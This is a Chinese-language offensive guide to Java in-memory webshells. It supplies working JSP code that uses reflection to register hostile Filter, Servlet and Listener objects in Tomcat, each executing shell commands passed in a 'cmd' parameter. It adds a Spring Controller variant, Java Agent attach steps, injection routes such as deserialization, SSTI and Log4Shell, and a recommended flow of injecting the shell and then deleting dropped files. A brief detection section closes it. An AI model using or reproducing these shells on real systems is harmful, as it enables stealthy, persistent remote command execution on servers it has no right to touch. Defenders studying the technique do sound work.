# Java 内存马（Memory Webshell）

内存马不写入文件，完全驻留在 JVM 内存中，重启后消失。适用于文件系统受监控或无写权限的场景。

## Table of Contents
- [Filter 内存马](#filter-内存马)
- [Servlet 内存马](#servlet-内存马)
- [Listener 内存马](#listener-内存马)
- [Spring Controller 内存马](#spring-controller-内存马)
- [Java Agent 内存马](#java-agent-内存马)
- [注入方式](#注入方式)
- [检测与清除](#检测与清除)

---

## Filter 内存马

**原理**：动态注册一个恶意 Filter，拦截所有请求并执行命令。

**优点**：所有基于 Servlet 容器的应用都支持（Tomcat/Jetty/WebLogic/JBoss）。

```java
// Filter 内存马核心代码（通过反序列化/SSTI/EL 注入）
<%@ page import="java.io.*,java.lang.reflect.*,org.apache.catalina.core.*" %>
<%
    // 获取 StandardContext
    ServletContext servletContext = request.getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    // 创建恶意 Filter
    Filter filter = new Filter() {
        @Override
        public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain)
                throws IOException, ServletException {
            String cmd = req.getParameter("cmd");
            if (cmd != null) {
                Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                StringBuilder sb = new StringBuilder();
                while ((line = br.readLine()) != null) sb.append(line).append("\n");
                resp.getWriter().write(sb.toString());
                return;
            }
            chain.doFilter(req, resp);
        }
        @Override public void init(FilterConfig c) {}
        @Override public void destroy() {}
    };

    // 注册 Filter
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName("evilFilter");
    filterDef.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName("evilFilter");
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    standardContext.addFilterMapBefore(filterMap);

    // 反射设置 FilterConfig
    Constructor<ApplicationFilterConfig> constructor =
        ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = constructor.newInstance(standardContext, filterDef);
    standardContext.filterStart();

    out.println("Filter Memory Shell Injected!");
%>
```

**使用**：注入后访问任意 URL 加 `?cmd=id` 即可执行命令。

---

## Servlet 内存马

```java
<%@ page import="java.io.*,java.lang.reflect.*,org.apache.catalina.core.*" %>
<%
    // 获取 StandardContext (同上)
    // ...

    // 创建恶意 Servlet
    Servlet servlet = new HttpServlet() {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp)
                throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if (cmd != null) {
                Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = br.readLine()) != null) resp.getWriter().println(line);
            }
        }
    };

    // 注册 Servlet
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName("evilServlet");
    wrapper.setServlet(servlet);
    wrapper.setServletClass(servlet.getClass().getName());
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/evil", "evilServlet");

    out.println("Servlet Memory Shell Injected at /evil?cmd=id");
%>
```

---

## Listener 内存马

**优点**：比 Filter 更隐蔽，在请求处理链最前端执行。

```java
<%@ page import="java.io.*,javax.servlet.*,org.apache.catalina.core.*" %>
<%
    // 获取 StandardContext (同上)
    // ...

    // 创建恶意 Listener
    ServletRequestListener listener = new ServletRequestListener() {
        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            String cmd = req.getParameter("cmd");
            if (cmd != null) {
                try {
                    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
                    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) sb.append(line).append("\n");
                    // 将结果写入 request attribute，由后续逻辑返回
                    req.setAttribute("cmd_result", sb.toString());
                } catch (Exception e) {}
            }
        }
        @Override public void requestDestroyed(ServletRequestEvent sre) {}
    };

    standardContext.addApplicationEventListener(listener);
    out.println("Listener Memory Shell Injected!");
%>
```

---

## Spring Controller 内存马

适用于 Spring Boot/MVC 应用：

```java
// 通过 SpEL 注入或反序列化触发
// 注册一个新的 Controller mapping

RequestMappingHandlerMapping mapping = 
    (RequestMappingHandlerMapping) context.getBean("requestMappingHandlerMapping");

Method method = evilController.getClass().getMethod("exec", HttpServletRequest.class);
RequestMappingInfo info = RequestMappingInfo.paths("/evil").build();
mapping.registerMapping(info, evilController, method);
```

---

## Java Agent 内存马

**原理**：通过 Java Instrumentation API 修改已加载类的字节码（如 `javax.servlet.http.HttpServlet#service`），在方法前插入恶意逻辑。

**优点**：最隐蔽，不添加新的 Filter/Servlet/Listener。
**缺点**：需要 attach 到目标 JVM（需要足够权限）。

```bash
# Step 1: 上传 agent.jar 到目标
# Step 2: 找到目标 Java 进程 PID
ps aux | grep java

# Step 3: attach agent
java -cp tools.jar:agent.jar AgentMain PID
```

Agent 注入后，修改 HttpServlet.service() 方法，在每个请求中检查特定参数执行命令。

---

## 注入方式

内存马代码需要通过某种漏洞注入到 JVM：

| 漏洞类型 | 注入方法 |
|----------|----------|
| 反序列化 | 构造 gadget chain 执行上述 Java 代码 |
| SSTI (FreeMarker/Velocity) | 通过模板执行 Java 反射代码 |
| EL 表达式注入 | `${Runtime.getRuntime().exec(...)}` |
| JSP webshell | 先上传普通 JSP → 执行内存马注入代码 → 删除 JSP |
| JNDI 注入 (Log4Shell) | 加载远程恶意类 |
| 文件上传 + 解压 | 上传 agent.jar → Java Attach |

**推荐流程**：先通过任何方式获取代码执行 → 注入 Filter 内存马 → 删除落地文件。

---

## 检测与清除

| 检测方式 | 命令/方法 |
|----------|-----------|
| 列出所有 Filter | 通过 JMX 或 StandardContext 反射 |
| 对比 web.xml | web.xml 中没有的 Filter/Servlet = 内存马 |
| Java Agent 检测 | 检查已加载的 Instrumentation Agent |
| 内存扫描 | arthas `sc *Filter*` 搜索可疑类 |

**清除**：重启应用即可清除所有内存马（它们只存在于内存中）。
